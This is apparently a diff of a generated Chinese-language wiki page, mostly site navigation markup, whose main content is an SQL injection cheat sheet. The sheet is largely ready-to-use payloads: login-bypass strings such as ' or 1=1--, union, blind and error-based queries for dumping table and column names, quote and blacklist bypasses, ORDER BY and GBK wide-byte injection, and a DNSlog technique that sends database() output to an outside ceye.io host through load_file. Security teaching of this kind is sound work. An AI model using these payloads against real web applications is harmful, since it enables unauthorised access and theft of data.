+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">生态开发激励</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../development/incentive-guide/" class="dropdown-item">生态激励指南</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">开发工具及相关资源介绍</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../development/tools/" class="dropdown-item">开发工具</a>
+</li>
+            
+<li>
+    <a href="../../development/resources/" class="dropdown-item">开发资源</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">ConfluxScan教程</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../development/apply-contract-fee/" class="dropdown-item">为合约申请Conflux赞助额度（合约代付）</a>
+</li>
+            
+<li>
+    <a href="../../development/address-NFT/" class="dropdown-item">NFT查看器教程</a>
+</li>
+            
+<li>
+    <a href="../../development/register-contract-and-token-display/" class="dropdown-item">如何在Scan上注册合约和代币展示</a>
+</li>
+            
+<li>
+    <a href="../../development/get-lp-token-address/" class="dropdown-item">查找LP代币的合约地址</a>
+</li>
+            
+<li>
+    <a href="../../development/internal-transaction/" class="dropdown-item">交易分析</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">Portal钱包教程</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../development/portal/" class="dropdown-item">Portal安装配置步骤</a>
+</li>
+            
+<li>
+    <a href="../../development/portal-setting/" class="dropdown-item">Portal钱包常用功能解析</a>
+</li>
+            
+<li>
+    <a href="../../development/add-token-to-portal/" class="dropdown-item">添加CRC20代币到Portal的方法与步骤</a>
+</li>
+            
+<li>
+    <a href="../../development/portal-faucet/" class="dropdown-item">ConfluxPortal切换为测试网领取测试币教程</a>
+</li>
+    </ul>
+  </li>
+                                </ul>
+                            </li>
+                            <li class="dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Ecosystem <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../ecosystem/introduction/" class="dropdown-item">生态介绍</a>
+</li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">Conflux基础生态教程</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../ecosystem/wcfx-cfx-exchange/" class="dropdown-item">WCFX与CFX代币互换</a>
+</li>
+            
+<li>
+    <a href="../../ecosystem/governance/" class="dropdown-item">Staking合约的质押与解质押</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">常见生态介绍及教程</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../ecosystem/tspace/" class="dropdown-item">Tspace 4.0 NFT平台</a>
+</li>
+            
+<li>
+    <a href="../../ecosystem/nft-box/" class="dropdown-item">NFTBox创新型资产交互平台</a>
+</li>
+            
+<li>
+    <a href="../../ecosystem/shuttleflow/" class="dropdown-item">Shuttleflow跨链工具</a>
+</li>
+            
+<li>
+    <a href="../../ecosystem/moonswap/" class="dropdown-item">moonswap生态</a>
+</li>
+            
+<li>
+    <a href="../../ecosystem/phantom/" class="dropdown-item">Phantom协议</a>
+</li>
+            
+<li>
+    <a href="../../ecosystem/dan/" class="dropdown-item">炼丹西游</a>
+</li>
+            
+<li>
+    <a href="../../ecosystem/guguo/" class="dropdown-item">古国序列</a>
+</li>
+    </ul>
+  </li>
+                                </ul>
+                            </li>
+                            <li class="dropdown active">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Web <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../introduction/" class="dropdown-item">Web 简介</a>
+</li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">SQL 注入</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="./" class="dropdown-item active">SQL 注入</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">XSS 跨站脚本攻击</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../xss/" class="dropdown-item">XSS</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">CSRF 跨站请求伪造</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../csrf/" class="dropdown-item">CSRF</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">SSRF 服务端请求伪造</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../ssrf/" class="dropdown-item">SSRF</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">PHP 代码审计</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../php/php/" class="dropdown-item">PHP 代码审计</a>
+</li>
+    </ul>
+  </li>
+                                </ul>
+                            </li>
+                            <li class="dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">BlockChain <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../blockchain/introduction/" class="dropdown-item">BlockChain Security Overview</a>
+</li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">Ethereum Security</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../blockchain/ethereum/introduction/" class="dropdown-item">Ethereum Overview</a>
+</li>
+            
+<li>
+    <a href="../../blockchain/ethereum/basics/" class="dropdown-item">Ethereum Basics</a>
+</li>
+            
+<li>
+    <a href="../../blockchain/ethereum/selector-encoding/" class="dropdown-item">Function Selector and Argument Encoding</a>
+</li>
+            
+<li>
+    <a href="../../blockchain/ethereum/storage/" class="dropdown-item">Ethereum Storage</a>
+</li>
+            
+<li>
+    <a href="../../blockchain/ethereum/opcodes/" class="dropdown-item">Ethereum Opcodes</a>
+</li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">Known Attacks</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../blockchain/ethereum/attacks/introduction/" class="dropdown-item">Introduction</a>
+</li>
+            
+<li>
+    <a href="../../blockchain/ethereum/attacks/re-entrancy/" class="dropdown-item">Re-Entrancy</a>
+</li>
+            
+<li>
+    <a href="../../blockchain/ethereum/attacks/overflow-underflow/" class="dropdown-item">Integer Overflow and Underflow</a>
+</li>
+            
+<li>
+    <a href="../../blockchain/ethereum/attacks/randomness/" class="dropdown-item">Randomness</a>
+</li>
+            
+<li>
+    <a href="../../blockchain/ethereum/attacks/airdrop-hunting/" class="dropdown-item">Airdrop Hunting</a>
+</li>
+            
+<li>
+    <a href="../../blockchain/ethereum/attacks/shortaddress/" class="dropdown-item">Short Address Attack</a>
+</li>
+            
+<li>
+    <a href="../../blockchain/ethereum/attacks/delegatecall/" class="dropdown-item">Delegatecall</a>
+</li>
+            
+<li>
+    <a href="../../blockchain/ethereum/attacks/uninitialized-storage-pointer/" class="dropdown-item">Uninitialized Storage Pointer</a>
+</li>
+            
+<li>
+    <a href="../../blockchain/ethereum/attacks/arbitrarywrite/" class="dropdown-item">Arbitrary Writing</a>
+</li>
+            
+<li>
+    <a href="../../blockchain/ethereum/attacks/create2/" class="dropdown-item">CREATE2</a>
+</li>
+            
+<li>
+    <a href="../../blockchain/ethereum/attacks/jump-oriented-programming/" class="dropdown-item">Jump Oriented Programming</a>
+</li>
+    </ul>
+  </li>
+            
+<li>
+    <a href="../../blockchain/ethereum/reverse/" class="dropdown-item">Smart Contract Reverse</a>
+</li>
+            
+<li>
+    <a href="../../blockchain/ethereum/challenges/" class="dropdown-item">区块链比赛题目</a>
+</li>
+            
+<li>
+    <a href="../../blockchain/ethereum/resources/" class="dropdown-item">学习资源</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">Public Blockchain Security</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../blockchain/publicblockchain/introduction/" class="dropdown-item">Public Blockchain Security Overview</a>
+</li>
+    </ul>
+  </li>
+                                </ul>
+                            </li>
+                            <li class="dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">NFT <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../nft/introduction/" class="dropdown-item">初识NFT</a>
+</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ml-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-toggle="modal" data-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li class="nav-item">
+                                <a rel="prev" href="../introduction/" class="nav-link">
+                                    <i class="fa fa-arrow-left"></i> Previous
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a rel="next" href="../xss/" class="nav-link">
+                                    Next <i class="fa fa-arrow-right"></i>
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="https://github.com/conflux-wiki/conflux-wiki/blob/master/docs/zh/docs/web/sqli.md" class="nav-link">Edit on conflux-wiki/conflux-wiki</a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-light navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-toggle="collapse" data-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-secondary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-level="1"><a href="#sql" class="nav-link">SQL 注入</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-level="2"><a href="#_1" class="nav-link">基本概念</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#_2" class="nav-link">常用工具</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#_3" class="nav-link">注入常见参数</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#_4" class="nav-link">语法参考与小技巧</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#_8" class="nav-link">后台万能密码</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#_9" class="nav-link">注入语句备忘</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#_19" class="nav-link">参考资料</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="sql">SQL 注入<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h1>
+<h2 id="_1">基本概念<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<ul>
+<li>SQL 注入是一种将 SQL 代码插入或添加到应用（用户）的输入参数中，之后再将这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。</li>
+<li>攻击者能够修改 SQL 语句，该进程将与执行命令的组件（如数据库服务器、应用服务器或 WEB 服务器）拥有相同的权限。</li>
+<li>如果 WEB 应用开发人员无法确保在将从 WEB 表单、cookie、输入参数等收到的值传递给 SQL 查询（该查询在数据库服务器上执行）之前已经对其进行过验证，通常就会出现 SQL 注入漏洞。</li>
+</ul>
+<h2 id="_2">常用工具<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Burp Suite：<a href="http://drops.xmd5.com/static/drops/tools-1548.html">Burp Suite 使用介绍</a></li>
+<li>Tamper Data (Firefox addon)</li>
+<li>HackBar (Firefox addon)</li>
+<li>sqlmap：<a href="http://drops.xmd5.com/static/drops/tips-143.html">sqlmap 用户手册</a></li>
+</ul>
+<h2 id="_3">注入常见参数<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<ul>
+<li><code>user()</code>：当前数据库用户</li>
+<li><code>database()</code>：当前数据库名</li>
+<li><code>version()</code>：当前使用的数据库版本</li>
+<li><code>@@datadir</code>：数据库存储数据路径</li>
+<li><code>concat()</code>：联合数据，用于联合两条数据结果。如 <code>concat(username,0x3a,password)</code></li>
+<li><code>group_concat()</code>：和 <code>concat()</code> 类似，如 <code>group_concat(DISTINCT+user,0x3a,password)</code>，用于把多条数据一次注入出来</li>
+<li><code>concat_ws()</code>：用法类似</li>
+<li><code>hex()</code> 和 <code>unhex()</code>：用于 hex 编码解码</li>
+<li><code>load_file()</code>：以文本方式读取文件，在 Windows 中，路径设置为 <code>\\</code></li>
+<li><code>select xxoo into outfile '路径'</code>：权限较高时可直接写文件</li>
+</ul>
+<h2 id="_4">语法参考与小技巧<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<h3 id="_5">行间注释<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<ul>
+<li>
+<p><code>--</code></p>
+<pre class="highlight"><code class="language-sql">DROP sampletable;--</code></pre>
+</li>
+<li>
+<p><code>#</code></p>
+<pre class="highlight"><code class="language-sql">DROP sampletable;#</code></pre>
+</li>
+</ul>
+<h3 id="_6">行内注释<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<ul>
+<li>
+<p><code>/*注释内容*/</code></p>
+<pre class="highlight"><code class="language-sql">DROP/*comment*/sampletable`   DR/**/OP/*绕过过滤*/sampletable`   SELECT/*替换空格*/password/**/FROM/**/Members</code></pre>
+</li>
+<li>
+<p><code>/*! MYSQL专属 */</code></p>
+<pre class="highlight"><code class="language-sql">SELECT /*!32302 1/0, */ 1 FROM tablename</code></pre>
+</li>
+</ul>
+<h3 id="_7">字符串编码<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code>ASCII()</code>：返回字符的 ASCII 码值</li>
+<li><code>CHAR()</code>：把整数转换为对应的字符</li>
+</ul>
+<h2 id="_8">后台万能密码<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<ul>
+<li><code>admin' --</code></li>
+<li><code>admin' #</code></li>
+<li><code>admin'/*</code></li>
+<li><code>' or 1=1--</code></li>
+<li><code>' or 1=1#</code></li>
+<li><code>' or 1=1/*</code></li>
+<li><code>') or '1'='1--</code></li>
+<li><code>') or ('1'='1--</code></li>
+<li>以不同的用户登陆 <code>' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--</code></li>
+</ul>
+<h2 id="_9">注入语句备忘<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h2>
+<h3 id="_10">数据库名<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
+<pre class="highlight"><code class="language-sql">SELECT database();
+SELECT schema_name FROM information_schema.schemata;</code></pre>
+<h3 id="_11">表名<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<ul>
+<li>
+<p>union 查询</p>
+<pre class="highlight"><code class="language-sql">--MySQL 4版本时用version=9，MySQL 5版本时用version=10
+UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;   /* 列出当前数据库中的表 */
+UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database();   /* 列出所有用户自定义数据库中的表 */
+SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!='information_schema' AND table_schema!='mysql';</code></pre>
+</li>
+<li>
+<p>盲注</p>
+<pre class="highlight"><code class="language-sql">AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; 'A'</code></pre>
+</li>
+<li>
+<p>报错</p>
+<pre class="highlight"><code class="language-sql">AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));
+-- 在5.1.5版本中成功。</code></pre>
+</li>
+</ul>
+<h3 id="_12">列名<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
+<ul>
+<li>
+<p>union 查询</p>
+<pre class="highlight"><code class="language-sql">UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'</code></pre>
+</li>
+<li>
+<p>盲注</p>
+<pre class="highlight"><code class="language-sql">AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; 'A'</code></pre>
+</li>
+<li>
+<p>报错</p>
+<pre class="highlight"><code class="language-sql">-- 在5.1.5版本中成功
+AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)
+-- MySQL 5.1版本修复了
+AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));</code></pre>
+</li>
+<li>
+<p>利用 <code>PROCEDURE ANALYSE()</code></p>
+<pre class="highlight"><code class="language-sql">-- 这个需要 web 展示页面有你所注入查询的一个字段
+-- 获得第一个段名
+SELECT username, permission FROM Users WHERE id = 1; 1 PROCEDURE ANALYSE()
+-- 获得第二个段名
+1 LIMIT 1,1 PROCEDURE ANALYSE()
+-- 获得第三个段名
+1 LIMIT 2,1 PROCEDURE ANALYSE()</code></pre>
+</li>
+</ul>
+<h3 id="_13">根据列名查询所在的表<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
+<pre class="highlight"><code class="language-sql">-- 查询字段名为 username 的表
+SELECT table_name FROM information_schema.columns WHERE column_name = 'username';
+-- 查询字段名中包含 username 的表
+SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';</code></pre>
+<h3 id="_14">绕过引号限制<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
+<pre class="highlight"><code class="language-sql">-- hex 编码
+SELECT * FROM Users WHERE username = 0x61646D696E
+-- char() 函数
+SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</code></pre>
+<h3 id="_15">绕过字符串黑名单<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
+<pre class="highlight"><code class="language-sql">SELECT 'a' 'd' 'mi' 'n';
+SELECT CONCAT('a', 'd', 'm', 'i', 'n');
+SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');
+SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');</code></pre>
+<p>使用 <code>CONCAT()</code> 时，任何个参数为 null，将返回 null，推荐使用 <code>CONCAT_WS()</code>。<code>CONCAT_WS()</code>函数第一个参数表示用哪个字符间隔所查询的结果。</p>
+<h3 id="_16">条件语句<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
+<p><code>CASE</code>, <code>IF()</code>, <code>IFNULL()</code>, <code>NULLIF()</code>.</p>
+<pre class="highlight"><code class="language-sql">SELECT IF(1=1, true, false);
+SELECT CASE WHEN 1=1 THEN true ELSE false END;</code></pre>
+<h3 id="_17">延时函数<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
+<p><code>SLEEP()</code>, <code>BENCHMARK()</code>.</p>
+<pre class="highlight"><code class="language-sql">' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '</code></pre>
+<h3 id="order-by">order by 后的注入<a class="headerlink" href="#order-by" title="Permanent link">&para;</a></h3>
+<p><code>order by</code> 由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。一般带有 <code>order</code> 或者 <code>order by</code> 的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：</p>
+<p>原始链接：<code>http://www.test.com/list.php?order=vote</code></p>
+<p>根据 <code>vote</code> 字段排序。找到投票数最大的票数 <code>num</code> 然后构造以下链接：</p>
+<pre class="highlight"><code>http://www.test.com/list.php?order=abs(vote-(length(user())&gt;0)*num)+asc</code></pre>
+<p>看排序是否变化。还有一种方法不需要知道任何字段信息，使用 <code>rand</code> 函数：</p>
+<pre class="highlight"><code>http://www.test.com/list.php?order=rand(true)
+http://www.test.com/list.php?order=rand(false)</code></pre>
+<p>以上两个会返回不同的排序，判断表名中第一个字符是否小于 128 的语句如下：</p>
+<pre class="highlight"><code>http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)&lt;=128))</code></pre>
+<h3 id="_18">宽字节注入<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h3>
+<p>国内最常使用的 GBK 编码，这种方式主要是绕过 <code>addslashes</code> 等对特殊字符进行转移的绕过。反斜杠 <code>\</code> 的十六进制为 <code>%5c</code>，在你输入 <code>%bf%27</code> 时，函数遇到单引号自动转移加入 <code>\</code>，此时变为 <code>%bf%5c%27</code>，<code>%bf%5c</code>
+在 GBK 中变为一个宽字符「縗」。<code>%bf</code> 那个位置可以是 <code>%81-%fe</code> 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。</p>
+<h3 id="dnslog">DNSLOG注入<a class="headerlink" href="#dnslog" title="Permanent link">&para;</a></h3>
+<p><strong>DNS在解析的时候会留下日志，通过读取多级域名的解析日志，来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。</strong></p>
+<p>dnslog平台：<a href="http://ceye.io/">http://ceye.io/</a></p>
+<p><pre class="highlight"><code>mysql&gt; use security;
 Database changed
 
-mysql&gt; select load_file(&#39;\\\\test.xxx.ceye.io\\abc&#39;);
+mysql&gt; select load_file('\\\\test.xxx.ceye.io\\abc');
 +-------------------------------------------+
-| load_file(&#39;\\\\test.xxx.ceye.io\\abc&#39;) |
+| load_file('\\\\test.xxx.ceye.io\\abc') |
 +-------------------------------------------+
 | NULL                                      |
 +-------------------------------------------+
 1 row in set (22.05 sec)
 
-mysql&gt; select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xxx.ceye.io\\abc&#39;));
+mysql&gt; select load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc'));
 +----------------------------------------------------------------------+
-| load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xxx.ceye.io\\abc&#39;)) |
+| load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc')) |
 +----------------------------------------------------------------------+
 | NULL                                                                 |
 +----------------------------------------------------------------------+
-1 row in set (0.00 sec)
-</code></pre></div> <img alt src=../php/figure/preg_match/sqli1.png></p> <h2 id=_19>参考资料<a class=headerlink href=#_19 title="Permanent link">&para;</a></h2> <ul> <li><a href=http://drops.xmd5.com/static/drops/tips-7840.html>SQL 注入速查表</a></li> <li><a href=http://drops.xmd5.com/static/drops/tips-7299.html>MySQL 注入技巧</a></li> <li><a href=http://drops.xmd5.com/static/drops/tips-123.html>MySQL 注入科普</a></li> <li><a href=http://www.91ri.org/4073.html>MySQL 注入总结</a></li> <li><a href=http://product.dangdang.com/23364650.html>《SQL 注入攻击与防御》</a></li> </ul> </article> </div> </div> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../introduction/ class="md-footer__link md-footer__link--prev" aria-label="上一页: Web 简介" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 上一页 </span> Web 简介 </div> </div> </a> <a href=../xss/ class="md-footer__link md-footer__link--next" aria-label="下一页: XSS" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 下一页 </span> XSS </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-footer-copyright> <div class=md-footer-copyright__highlight> Copyright &copy; 2020 - 2021 Conflux Wiki Team </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "search.suggest", "search.highlight", "search.share"], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../assets/javascripts/workers/search.477d984a.min.js", "version": null}</script> <script src=../../assets/javascripts/bundle.ddd52ceb.min.js></script> <script src=https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js></script> <script src=../../static/js/extra.js></script> <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script> </body> </html>
+1 row in set (0.00 sec)</code></pre>
+<img alt="" src="../php/figure/preg_match/sqli1.png" /></p>
+<h2 id="_19">参考资料<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="http://drops.xmd5.com/static/drops/tips-7840.html">SQL 注入速查表</a></li>
+<li><a href="http://drops.xmd5.com/static/drops/tips-7299.html">MySQL 注入技巧</a></li>
+<li><a href="http://drops.xmd5.com/static/drops/tips-123.html">MySQL 注入科普</a></li>
+<li><a href="http://www.91ri.org/4073.html">MySQL 注入总结</a></li>
+<li><a href="http://product.dangdang.com/23364650.html">《SQL 注入攻击与防御》</a></li>
+</ul></div>
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2020 - 2021 Conflux Wiki Team</p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script>
+            var base_url = "../..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../../js/base.js" defer></script>
+        <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js" defer></script>
+        <script src="../../static/js/extra.js" defer></script>
+        <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+        <script src="../../search/main.js" defer></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
